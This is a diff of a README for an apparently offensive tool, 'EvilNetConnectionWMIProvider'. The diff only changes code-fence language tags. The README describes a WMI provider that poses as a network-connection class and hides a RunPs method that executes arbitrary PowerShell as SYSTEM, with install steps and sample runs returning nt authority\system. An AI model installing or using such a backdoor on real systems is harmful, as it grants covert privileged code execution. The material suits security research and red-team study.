@@ -3,7 +3,7 @@
 - Contains a RunPs Method that executes arbitrary PowerShell as System
 
 ## Install Provider:
-```
+```powershell
 - Download and unzip project
 - Open administrator prompt
 - cd to directory containing EvilNetConnectionWMIProvider.dll
@@ -13,13 +13,13 @@ PS <downloadpath>\EvilNetConnectionWMIProvider-master\EvilNetConnectionWMIProvid
 ```
 
 ## Uninstall Provider
-```
+```powershell
 PS C:\Windows\system32> cd <downloadpath>\EvilNetConnectionWMIProvider-master\EvilNetConnectionWMIProvider\bin\Debug
 PS <downloadpath>\EvilNetConnectionWMIProvider-master\EvilNetConnectionWMIProvider\bin\Debug> Uninstall "InstallUtil.exe /u EvilNetConnectionWMIProvider.dll"
 ```
 
 ## Query Network Connections (netstat functionality):
-```
+```powershell
 PS C:\Windows\system32> Get-WMIObject Win32_NetConnection | select LocalAddress, LocalPort, RemoteAddress, RemotePort, Protocol, State | ft -AutoSize
 
 LocalAddress LocalPort RemoteAddress  RemotePort Protocol State
@@ -67,7 +67,7 @@ LocalAddress LocalPort RemoteAddress  RemotePort Protocol State
 ```
 
 ## Execute Arbitrary PowerShell As SYSTEM
-```
+```powershell
 PS C:\Windows\system32> Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList "whoami", $NULL
 
 __GENUS          : 2
@@ -84,7 +84,7 @@ ReturnValue      : nt authority\system
 PSComputerName   :
 ```
 
-```
+```powershell
 PS C:\Windows\system32> Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList "Get-Process", $NULL
 
 __GENUS          : 2
